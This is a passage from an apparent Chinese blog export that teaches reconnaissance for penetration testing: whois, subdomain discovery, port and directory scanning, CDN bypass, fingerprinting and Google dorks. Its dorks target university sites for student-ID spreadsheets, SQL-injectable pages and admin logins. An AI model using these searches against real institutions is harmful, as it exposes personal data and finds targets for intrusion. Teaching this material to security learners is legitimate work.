学号\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021636-76854a1d-d7e8-4ff2-b3bb-bdcc3c447153.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&originHeight=823&originWidth=1325&status=done&style=none&width=415)\n2、搜索高校域名中存在php?id=的页面，尝试测试是否存在SQL注入\n语法：site:edu.cn inurl:php?id=\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021928-cbde4c02-b00f-47b6-b4fa-ca9ca587e9d0.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&originHeight=793&originWidth=1025&status=done&style=none&width=415)\n3、搜索高校的后台登录页面\n语法：site:edu.cn intitle:后台登录\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318022137-beeab898-94ca-4ed8-b7fc-4f93370d57f5.png#align=left&display=inline&height=358&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1011&status=done&style=none&width=416)\n","source":"_posts/如何进行信息收集.md","raw":"---\ntitle: 如何进行信息收集\ntags: \n  - 信息收集\n  - web安全\ncategories: web安全\nkeywords: 'web安全,信息收集'\ndescription: 针对一个站点如何进行信息收集？\ncover: https://img2.baidu.com/it/u=207705934,1439123695&fm=26&fmt=auto&gp=0.jpg\ndate: 2020-10-02 10:45:41\n---\n\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n# 网络安全法\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318010564-9fc29c4c-dae7-4181-b53f-e9b50e2c7079.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&originHeight=176&originWidth=895&status=done&style=none&width=415)\n上面是中国网络安全法第四十一条，因为与这篇推文相对应，所有拿出来用。信息收集的作用很强大，希望大家在学习的同时，注意把握度量！\n**本篇推文仅涉及信息收集教学，如有任何不良情况，请第一时间联系我删除。**\n# 前言\n归结而言，信息搜集，是渗透测试的灵魂。其实在日常生活中我们无时无刻不在进行信息收集。要参加一个比赛，我们会提前了解比赛内容，这就是信息收集；要追求一个女生，我们会通过接触她的闺蜜，了解她的喜好，获取她的微信号、QQ号等，这也是信息收集。在抗战时期，信息收集的重要性就体现出来了，一场战争的输赢，在很大程度上就依赖于信息收集的完整性。敌军的数量有多少、军队部署怎么样等，可以让我们提前针对并部署相应的方案来应对。这也是为什么当时情报部门非常重要的体现了。\n那么接下来，我将详细介绍在渗透测试中如何进行信息收集。\n# 1.whois信息\n\n![](https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318010785-fb525994-7672-49f7-bbb7-ccb4d4c5773e.jpeg#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=599&originWidth=1004&status=done&style=none&width=416)\n什么是whois？whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库。在渗透测试中，whois可以很好地收集到目标域名的相应信息，例如注册人的邮箱，姓名，手机号等。进行whois信息收集一般是通过在线工具：\n\n###### 站长之家\n[http://whois.chinaz.com/](http://whois.chinaz.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011036-2643d590-cab6-4fb7-97b0-390357bfd661.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&originHeight=622&originWidth=1514&status=done&style=none&width=415)\n###### 中国万网\n    [https://whois.aliyun.com/](https://whois.aliyun.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011319-c2188cc2-200d-41cd-b815-b92cfdf44f95.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&originHeight=757&originWidth=1639&status=done&style=none&width=415)\n###### Whois.com\n    [https://www.whois.com/](https://www.whois.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011570-840227d8-d2c1-4801-bb2a-5d20217c7755.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=818&originWidth=1649&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011880-2eb94c58-36a0-4ef8-81d5-a38cda973365.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=876&originWidth=1560&status=done&style=none&width=415)\n个人还是比较喜欢whois.com的，因为站长之家等网站会对一些信息进行隐藏，所以我比较多用其他的。Whois查询网站还有很多很多，可以通过百度whois来获取。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012193-94c82cb1-a2a2-4525-bdfd-87651d245f70.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1649&status=done&style=none&width=416)\n\n这里还是以站长之家whois 查询sougou.com来举例：\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012469-52918a1e-d2c4-4e00-86a9-375f4b9db14d.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=688&originWidth=1101&status=done&style=none&width=415)\n可以看到，这里我查询的域名是sougou.com，通过whois，我可以知道注册商，注册人的邮箱，联系电话等信息。在这些信息后面有个whois反查，这个也很重要，whois反查可以查询该联系人或者该邮箱还注册了什么网站。如图为whois反查联系电话的结果，可以看到下面都是该联系电话注册的网站。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012718-b5043e7e-b219-42ed-b588-a1147c8c1569.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&originHeight=796&originWidth=1545&status=done&style=none&width=416)\n\n\n# 2.子域名查询\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012941-9bb94596-8575-4708-8afd-354f032e0c3f.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&originHeight=124&originWidth=252&status=done&style=none&width=189)\n首先介绍一下什么是域名。\n这里我以微信公众平台的域名举例。如图可以看到，这里的URL的前面的部分是mp.weixin.qq.com。这就是域名。在这里我们可以进行拆分为以下几个域名：\n1.    mp.weixin.qq.com\n2.    weixin.qq.com\n3.    qq.com\n\n最短的那个qq.com便是根域名，也叫一级域名，这种域名所在的网站相对安全，很难对其进行渗透测试。但是根域名可以衍生出很多很多子域名，他们有直接或者间接的联系。也就是说，如果你对一个子域名进行了渗透测试，很可能会间接对根域名所在服务器进行影响，所以我们可以对子域名进行信息查询，进而可以扩大攻击范围，子域名一定是有关联的，很多时候基本上都同属一个公司。\n查询子域名有以下几种方法：\n1、通过google语法的site\n2、通过layer子域名挖掘机\n3、通过在线网站\n4、通过burp的爬虫模块\n###### 1.google语法的site语法：\n搜索引擎非常强大，site语法的做用是查询site后面的域名下的所有站点，包括子域名；如图所示，我查询了baidu.com，下面出现的全部都是baidu.com域名下的网站，如[site.baidu.com](http://www.baidu.com/link?url=QbP0CFzbjqE-QGJYkDXlWiAZpdBm9d976Ij32TA6LUe&ck=5250.6.1604460120086.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg)、baike.baidu.com、[duer.baidu.com/](https://www.baidu.com/link?url=3FgwnT9QFN6vq3kWs5j6pwOABJaCIh7TsI3BTK9ztZi&ck=1572.23.10095.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg&wd=&eqid=c03388eb000019b6000000065fa21e1e)等。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013238-cd05bb41-5943-41a7-9763-2d548e52b163.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=885&originWidth=1573&status=done&style=none&width=415)\n###### 2.layer子域名挖掘机\n轻量级的子域名挖掘神器，它的原理是通过对于子域名进行爆破，获取相应的子域名再呈现出来，具体用法很简单，填写主域名、设置端口、选择dns解析的服务器，最后点击启动即可，如图所示，我爆破获取百度的子域名。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318013785-a9990f28-ea8a-4597-ac48-1dfa7eb6deab.png#align=left&display=inline&height=226&margin=%5Bobject%20Object%5D&originHeight=815&originWidth=1498&status=done&style=none&width=415)\n###### 3.在线网站\n站长工具\n[http://tool.chinaz.com/subdomain/](http://tool.chinaz.com/subdomain/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014014-94735611-5da3-4581-986f-0e6fd6cc428d.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=819&originWidth=1456&status=done&style=none&width=415)\n\n微步社区\n[https://x.threatbook.cn/](https://x.threatbook.cn/)\n微步社区最大的作用是用来查询威胁情报的，查询子域名我并不是很喜欢，比较少用。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014278-4f959e7d-4af0-43c6-91d3-d5bf92e81adf.png#align=left&display=inline&height=169&margin=%5Bobject%20Object%5D&originHeight=674&originWidth=1653&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014509-9d1e0079-2f8c-4a3a-9909-b37ee5990d6a.png#align=left&display=inline&height=118&margin=%5Bobject%20Object%5D&originHeight=459&originWidth=1615&status=done&style=none&width=415)\n在线二级域名子域名查询\n[http://tools.bugscaner.com/subdomain/](http://tools.bugscaner.com/subdomain/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318014754-47fa1d03-4d3c-488e-9bc5-823769f28d5a.png#align=left&display=inline&height=196&margin=%5Bobject%20Object%5D&originHeight=727&originWidth=1541&status=done&style=none&width=416)\n###### 4.Burp的Spider模块\n首先要先捕获到主域名的数据包\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015002-6bb5d9cf-783c-446c-85fd-60e2c8f4bcf3.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n右键send to Spider\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015253-75033e01-6639-4e33-9f04-a47e86e51c3f.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015499-4bd67a81-244c-425a-929f-dd1bc5b6e968.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n在target模块便可以看到很多百度的子域名，而且burp的好处是不仅仅查询子域名，还能够查询到站点地图，这在很大程度上帮助我们了解了网站的具体框架结构，为后续的渗透测试奠定基础。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318015717-513eea50-902a-4bdc-b1c0-0c3b1d3cebf8.png#align=left&display=inline&height=276&margin=%5Bobject%20Object%5D&originHeight=838&originWidth=1262&status=done&style=none&width=415)\n总而言之，收集子域名的方法还有很多，我比较喜欢用的就是layer子域名挖掘机和burp，当然还有很多在线工具可以通过百度子域名获取到。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016022-e11516a3-b4f0-428c-8198-ca2c8cc7a76a.png#align=left&display=inline&height=253&margin=%5Bobject%20Object%5D&originHeight=839&originWidth=1381&status=done&style=none&width=416)\n# 3.端口扫描\n###### Nmap\n说到端口扫描就马上可以想到kali Linux这个网络安全人员所熟知的系统。在kali系统里面集成了很多渗透测试的工具，其中有一款叫**Nmap**的工具，可以通过相应语法对目标主机进行端口扫描，得到目标主机的端口开放情况信息。有些危险端口开放了我们就可以尝试入侵，例如445|3306|22|1433|6379 可以尝试爆破或者是使用某些端口存在漏洞的服务。而且有可能一台服务器上面不同端口代表着不同的Web网站。\n![](https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318016319-d7d1ce62-3b0c-4b38-8c8f-68a533fcbdcf.jpeg#align=left&display=inline&height=320&margin=%5Bobject%20Object%5D&originHeight=831&originWidth=1080&status=done&style=none&width=416)\n基础命令\n-p  指定端口扫描\n-v    显示扫描过程\n-Pn 跳过主机发现过程直接端口扫描 [目标禁ping时使用]\n-O   探测主机操作系统\n-A   全面扫描，包括一切探测，由于动静太大而且时间问题不怎么使用\n\n端口扫描状态\nOpend 端口开放\nClosed 端口关闭\nFiltered 端口被过滤\n###### 在线网站\n站长之家(因为要防止恶意攻击，所以只能单个端口测试)\n[https://tool.chinaz.com/port/](https://tool.chinaz.com/port/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016520-ce55aeb8-c365-44d1-b2cf-b2ea74ae5b3f.png#align=left&display=inline&height=128&margin=%5Bobject%20Object%5D&originHeight=466&originWidth=1518&status=done&style=none&width=416)\nPostJson在线端口检测\n[http://coolaf.com/tool/port](http://coolaf.com/tool/port)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318016801-603296e2-91f9-4e25-a719-994febd4fb4d.png#align=left&display=inline&height=191&margin=%5Bobject%20Object%5D&originHeight=786&originWidth=1704&status=done&style=none&width=415)\n\n\n# 4.目录扫描\n目录是什么，目录就是一个网站的骨架，正如我们平时访问一个网站，先是进入了主目录，或者说访问了index.php/index.html等index文件，但是我们不知道目标网站还有哪些目录文件是我们可以访问的，所以就需要进行目录扫描了。下面介绍如何进行目录扫描。\n###### 御剑目录扫描工具\n御剑是一款能够通过字典对目标域名进行轮询访问，检测http状态码的软件，如果得到200回应就记录下来，也就得到了我们需要的目录信息。\n这里随便扫了一个靶场，可以看到网站目录除了index.php之外还有一个robosts文件。robots.txt是一个基本上在每个网站中都会放置的文件，里面会标明了哪些目录可以爬取，哪些不可以爬取，当然这往往只是君子协议，真的爬取了也是无法拦截的。渗透测试过程中往往可以通过访问robots文件查看一些敏感目录。\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017024-3f6d7017-9bb4-4ed6-b7b5-cfa57d7784b6.png#align=left&display=inline&height=189&margin=%5Bobject%20Object%5D&originHeight=422&originWidth=929&status=done&style=none&width=415)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017250-f2829b8b-9724-4f35-8b6f-34435020bdfa.png#align=left&display=inline&height=112&margin=%5Bobject%20Object%5D&originHeight=191&originWidth=706&status=done&style=none&width=415)\n# 5.C段\nC段，即IP地址的C段地址，如192.168.1.0/24。在渗透测试过程中，一个公司可能由于业务原因，会购买多个公网IP，那么为了方便，这些IP往往是相连的，甚至该公司会直接将那个公网IP的一个C段买下来。也就是说，测试站点所处的IP地址的C段，很可能也是该公司的资产，在渗透测试过程中可以通过迂回战术，先拿下C段的该公司的其他站点，再来对主站点进行渗透测试。\n       要获取C段就涉及了一个内容——CDN，内容分发网络，是为了负载均衡，内容分发等而创建的一个智能虚拟网络。对于一些大公司来说，他的业务可能会有非常多以至于全世界都有人访问，那么一台服务器是不足以完成那么大的工作量的，这时候就需要购买CDN了，对于不同区域的用户分发不同的IP地址，里面存储了需要访问的资源，能够很大程度上减轻服务器的压力。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318017568-5c04002e-c8b5-4e82-ba3d-7abd035154a3.png#align=left&display=inline&height=161&margin=%5Bobject%20Object%5D&originHeight=640&originWidth=1653&status=done&style=none&width=415)\n       有了CDN的存在也就是说，我们通过ping域名的方式获取的IP地址不一定是真实IP地址，所以我们就需要绕过CDN来获取真实IP地址进而获取C段。 下面介绍如何判断是否有CDN以及如何获取真实IP。\n## 判断是否有CDN\n有一个在线工具叫多地点Ping，可以通过不同地点ping域名的对应IP是否相同来判断有没有CDN服务。\n[https://www.ping.cn/ping/](https://www.ping.cn/ping/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018031-574a3b07-13e2-43a7-ab42-68fc29bfe3b9.png#align=left&display=inline&height=201&margin=%5Bobject%20Object%5D&originHeight=827&originWidth=1710&status=done&style=none&width=416)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018340-373bc336-a54f-4277-b598-d393df18b9f5.png#align=left&display=inline&height=204&margin=%5Bobject%20Object%5D&originHeight=808&originWidth=1756&status=done&style=none&width=444)\n这里我测试的是baidu.com，很明显不同地区的IP不同，所以存在CDN。\n## 绕过CDN获取真实IP\n1、 子域名查询\n子域名与主域名同一服务器\nCDN挂在主域名上，但是不一定挂在子域名上\n\n2、邮件服务器\n从邮件服务器请求邮件，邮件中可以获取真实IP\n\n\n3、国外地址请求（国外ping）\n4、遗留文件，扫描全网\n例如通过phpinfo.php文件中获取IP地址\n全网ping，从CDN中筛选真实IP\n\n\n5、fofa、shodan、zoomeye搜索特定文件/信息\n6、dns历史记录\n查询未使用cdn之前留下的真实IP记录\n\n\n# 6.旁站\n旁站，即同IP不同站点。旁站一般都是和目标站点在同一个内网或者是同一台服务器。在渗透测试过程中为了加大攻击面，往往还会获取目标的旁站，从旁站入手进行渗透测试。下面介绍如何获取旁站，一般都是通过在线工具获取。\n###### 站长工具\n[http://stool.chinaz.com/same](http://stool.chinaz.com/same)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018532-9a0319b4-0f54-48e3-adc2-2d29d669163a.png#align=left&display=inline&height=240&margin=%5Bobject%20Object%5D&originHeight=881&originWidth=1525&status=done&style=none&width=415)\n###### The Web of WebScan\n       [https://www.webscan.cc/](https://www.webscan.cc/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318018886-df5563b1-1301-4226-b344-36b4f314564e.png#align=left&display=inline&height=217&margin=%5Bobject%20Object%5D&originHeight=851&originWidth=1630&status=done&style=none&width=416)\n# 7.指纹识别\n       指纹识别，也就是通过指纹信息判断当前系统的环境配置、使用的CMS等。说到指纹我们都不陌生了，手机就有指纹解锁。我们可以通过指纹信息判断一个人的身份，是否为当前手机的机主。渗透测试中的指纹识别也差不多，通过识别目标网站是否使用CMS模板搭建，使用了什么框架等，可以让我们能够针对性的对其进行渗透。\n       CMS，内容管理系统。即一套web系统的模板，我们可以通过CMS快速搭建一个网站，这种模板的代码一般开源，在网上也有很多旧版本的漏洞。通过识别是什么CMS，我们就可以搜索该CMS的历史漏洞，即Nday，测试是否有修复。\n       指纹识别一般通过下面几种在线工具进行识别。\n###### Whatweb在线指纹识别\n[http://whatweb.bugscaner.com/](http://whatweb.bugscaner.com/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019120-8c399c9b-1803-4b93-b5a9-6d1a8e2797bf.png#align=left&display=inline&height=212&margin=%5Bobject%20Object%5D&originHeight=730&originWidth=1434&status=done&style=none&width=416)\n如图我们成功判断出该站点的cms为dedecms，那么就可以通过dedecms的历史漏洞进行渗透测试。\n###### 微步社区（tips:只输入域名即可，不需要加上http://）\n[https://x.threatbook.cn/](https://x.threatbook.cn/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019391-b0d067bd-76ae-4851-94ce-3f628b4040e7.png#align=left&display=inline&height=187&margin=%5Bobject%20Object%5D&originHeight=797&originWidth=1767&status=done&style=none&width=415)\n微步社区不怎么用，还是以查询威胁情报为主的，这里看到可以查询到域名解析、子域名、whois等信息。\n###### 云溪指纹（需要邀请码，需要注册，还挺麻烦的）\n[https://www.yunsee.cn/](https://www.yunsee.cn/)\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019653-f806593e-20f9-44c0-8c03-8f8c288528e2.png#align=left&display=inline&height=200&margin=%5Bobject%20Object%5D&originHeight=813&originWidth=1687&status=done&style=none&width=415)\n可以看到云溪指纹查询的信息就很全面，然后还提供了查看漏洞功能，所以个人是很喜欢使用云溪指纹识别的。\n# 8. 内容敏感信息泄露 （google hacking）\n###### Google搜索引擎\nGoogle是一款十分强大的搜索引擎，黑客们常常借助它搜索网站的一些敏感目录和文件，甚至可以利用它的搜索功能来自动攻击那些有漏洞的网站；而有些人可以通过搜索把某个个人的信息，包括住址、电话号码、出生年月等都可以搜索出来；当然我们在日常的生活中正确的借助Google搜索也可以更加高效的找到我们需要的东西。也就是说我们通过谷歌搜索引擎，加上google语法，能够收集到一些敏感信息。\n###### Google镜像站\n我们都知道，国内是无法访问google搜索引擎的，虽然其他搜索引擎也是可以使用google语法的，但是会过滤掉一些信息，用起来很不方便，所以还是推荐使用谷歌。\n有一款工具叫**谷歌镜像站**，是国人搭建的类似google搜索引擎的网站，可以达到类似google的效果。谷歌镜像站可以通过百度获得。\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318019936-1bd50b23-7b3c-4a70-aa96-658e0335aca6.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&originHeight=715&originWidth=995&status=done&style=none&width=415)\n\n###### Google语法\n1.site\nsite:edu.cn //搜索该域名下的所有站点，包括子域名\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020203-b6a9c5f9-0501-4077-8730-96ea362b3292.png#align=left&display=inline&height=355&margin=%5Bobject%20Object%5D&originHeight=868&originWidth=1016&status=done&style=none&width=416)\n2.inurl\n搜索域名中与关键字匹配的页面\n常用的有\ninurl:php?id= //查询域名中带有php?id=的页面\ninurl:admin.php //查询域名中带有admin.php的页面，多用于查询后台\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020523-4b20c405-75d4-40d8-a820-4ec187a5ab43.png#align=left&display=inline&height=354&margin=%5Bobject%20Object%5D&originHeight=859&originWidth=1008&status=done&style=none&width=415)\n3.intitle\n搜索网页中的标题内容与关键字匹配的页面\nintitle:后台管理 //查询网页标题含有后台管理的页面\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318020892-9b3a08b4-41fd-47b9-9754-1b31090ff1a1.png#align=left&display=inline&height=370&margin=%5Bobject%20Object%5D&originHeight=862&originWidth=966&status=done&style=none&width=415)\n4.intext\n搜索网页内容与关键字匹配的页面\nintext:dedecms //查询网页内容含有dedecms的页面\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021172-54b43fd9-0539-45f9-991c-a972cdf7a329.png#align=left&display=inline&height=363&margin=%5Bobject%20Object%5D&originHeight=877&originWidth=1004&status=done&style=none&width=416)\n5.filetype\n搜索文件类型与关键字匹配的文件\nfiletype:xls //查询excel文件\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021378-a16c3394-66ad-4e74-a6e0-c35950d33e3c.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=860&originWidth=1379&status=done&style=none&width=415)\n###### 内容敏感信息泄露\n1、搜索高校存在学号字眼的excel文件，用来获取学号信息\n语法：filetype:xls site:edu.cn 学号\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021636-76854a1d-d7e8-4ff2-b3bb-bdcc3c447153.png#align=left&display=inline&height=258&margin=%5Bobject%20Object%5D&originHeight=823&originWidth=1325&status=done&style=none&width=415)\n2、搜索高校域名中存在php?id=的页面，尝试测试是否存在SQL注入\n语法：site:edu.cn inurl:php?id=\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318021928-cbde4c02-b00f-47b6-b4fa-ca9ca587e9d0.png#align=left&display=inline&height=321&margin=%5Bobject%20Object%5D&originHeight=793&originWidth=1025&status=done&style=none&width=415)\n3、搜索高校的后台登录页面\n语法：site:edu.cn intitle:后台登录\n\n![](https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318022137-beeab898-94ca-4ed8-b7fc-4f93370d57f5.png#align=left&display=inline&height=358&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1011&status=done&style=none&width=416)\n","slug":"如何进行信息收集","published":1,"updated":"2021-08-07T16:22:26.803Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckt46mpgl005cvkq31a1ub2ef","content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"网络安全法\"><a href=\"#网络安全法\" class=\"headerlink\" title=\"网络安全法\"></a>网络安全法</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318010564-9fc29c4c-dae7-4181-b53f-e9b50e2c7079.png#align=left&display=inline&height=82&margin=%5Bobject%20Object%5D&originHeight=176&originWidth=895&status=done&style=none&width=415\"><br>上面是中国网络安全法第四十一条，因为与这篇推文相对应，所有拿出来用。信息收集的作用很强大，希望大家在学习的同时，注意把握度量！<br><strong>本篇推文仅涉及信息收集教学，如有任何不良情况，请第一时间联系我删除。</strong></p>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>归结而言，信息搜集，是渗透测试的灵魂。其实在日常生活中我们无时无刻不在进行信息收集。要参加一个比赛，我们会提前了解比赛内容，这就是信息收集；要追求一个女生，我们会通过接触她的闺蜜，了解她的喜好，获取她的微信号、QQ号等，这也是信息收集。在抗战时期，信息收集的重要性就体现出来了，一场战争的输赢，在很大程度上就依赖于信息收集的完整性。敌军的数量有多少、军队部署怎么样等，可以让我们提前针对并部署相应的方案来应对。这也是为什么当时情报部门非常重要的体现了。<br>那么接下来，我将详细介绍在渗透测试中如何进行信息收集。</p>\n<h1 id=\"1-whois信息\"><a href=\"#1-whois信息\" class=\"headerlink\" title=\"1.whois信息\"></a>1.whois信息</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/jpeg/12366538/1612318010785-fb525994-7672-49f7-bbb7-ccb4d4c5773e.jpeg#align=left&display=inline&height=248&margin=%5Bobject%20Object%5D&originHeight=599&originWidth=1004&status=done&style=none&width=416\"><br>什么是whois？whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库。在渗透测试中，whois可以很好地收集到目标域名的相应信息，例如注册人的邮箱，姓名，手机号等。进行whois信息收集一般是通过在线工具：</p>\n<h6 id=\"站长之家\"><a href=\"#站长之家\" class=\"headerlink\" title=\"站长之家\"></a>站长之家</h6><p><a href=\"http://whois.chinaz.com/\">http://whois.chinaz.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011036-2643d590-cab6-4fb7-97b0-390357bfd661.png#align=left&display=inline&height=170&margin=%5Bobject%20Object%5D&originHeight=622&originWidth=1514&status=done&style=none&width=415\"></p>\n<h6 id=\"中国万网\"><a href=\"#中国万网\" class=\"headerlink\" title=\"中国万网\"></a>中国万网</h6><p>    <a href=\"https://whois.aliyun.com/\">https://whois.aliyun.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011319-c2188cc2-200d-41cd-b815-b92cfdf44f95.png#align=left&display=inline&height=192&margin=%5Bobject%20Object%5D&originHeight=757&originWidth=1639&status=done&style=none&width=415\"></p>\n<h6 id=\"Whois-com\"><a href=\"#Whois-com\" class=\"headerlink\" title=\"Whois.com\"></a>Whois.com</h6><p>    <a href=\"https://www.whois.com/\">https://www.whois.com/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011570-840227d8-d2c1-4801-bb2a-5d20217c7755.png#align=left&display=inline&height=206&margin=%5Bobject%20Object%5D&originHeight=818&originWidth=1649&status=done&style=none&width=416\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318011880-2eb94c58-36a0-4ef8-81d5-a38cda973365.png#align=left&display=inline&height=233&margin=%5Bobject%20Object%5D&originHeight=876&originWidth=1560&status=done&style=none&width=415\"><br>个人还是比较喜欢whois.com的，因为站长之家等网站会对一些信息进行隐藏，所以我比较多用其他的。Whois查询网站还有很多很多，可以通过百度whois来获取。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012193-94c82cb1-a2a2-4525-bdfd-87651d245f70.png#align=left&display=inline&height=219&margin=%5Bobject%20Object%5D&originHeight=870&originWidth=1649&status=done&style=none&width=416\"></p>\n<p>这里还是以站长之家whois 查询sougou.com来举例：<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012469-52918a1e-d2c4-4e00-86a9-375f4b9db14d.png#align=left&display=inline&height=259&margin=%5Bobject%20Object%5D&originHeight=688&originWidth=1101&status=done&style=none&width=415\"><br>可以看到，这里我查询的域名是sougou.com，通过whois，我可以知道注册商，注册人的邮箱，联系电话等信息。在这些信息后面有个whois反查，这个也很重要，whois反查可以查询该联系人或者该邮箱还注册了什么网站。如图为whois反查联系电话的结果，可以看到下面都是该联系电话注册的网站。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012718-b5043e7e-b219-42ed-b588-a1147c8c1569.png#align=left&display=inline&height=214&margin=%5Bobject%20Object%5D&originHeight=796&originWidth=1545&status=done&style=none&width=416\"></p>\n<h1 id=\"2-子域名查询\"><a href=\"#2-子域名查询\" class=\"headerlink\" title=\"2.子域名查询\"></a>2.子域名查询</h1><p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1612318012941-9bb94596-8575-4708-8afd-354f032e0c3f.png#align=left&display=inline&height=93&margin=%5Bobject%20Object%5D&originHeight=124&originWidth=252&status=done&style=none&width=189\"><br>首先介绍一下什么是域名。<br>这里我以微信公众平台的域名举例。如图可以看到，这里的URL的前面的部分是mp.weixin.qq.com。这就是域名。在这里我们可以进行拆分为以下几个域名：<br>1.    mp.weixin.qq.com<br>2.    weixin.qq.com<br>3.    qq.com</p>\n<p>最短的那个qq.com便是根域名，也叫一级域名，这种域名所在的网站相对安全，很难对其进行渗透测试。但是根域名可以衍生出很多很多子域名，他们有直接或者间接的联系。也就是说，如果你对一个子域名进行了渗透测试，很可能会间接对根域名所在服务器进行影响，所以我们可以对子域名进行信息查询，进而可以扩大攻击范围，子域名一定是有关联的，很多时候基本上都同属一个公司。<br>查询子域名有以下几种方法：<br>1、通过google语法的site<br>2、通过layer子域名挖掘机<br>3、通过在线网站<br>4、通过burp的爬虫模块</p>\n<h6 id=\"1-google语法的site语法：\"><a href=\"#1-google语法的site语法：\" class=\"headerlink\" title=\"1.google语法的site语法：\"></a>1.google语法的site语法：</h6><p>搜索引擎非常强大，site语法的做用是查询site后面的域名下的所有站点，包括子域名；如图所示，我查询了baidu.com，下面出现的全部都是baidu.com域名下的网站，如<a href=\"http://www.baidu.com/link?url=QbP0CFzbjqE-QGJYkDXlWiAZpdBm9d976Ij32TA6LUe&ck=5250.6.1604460120086.0.0.263.313.0&shh=www.baidu.com&sht=baiduhome_pg\">site.baidu.com</a>、baike.baidu.com、<a 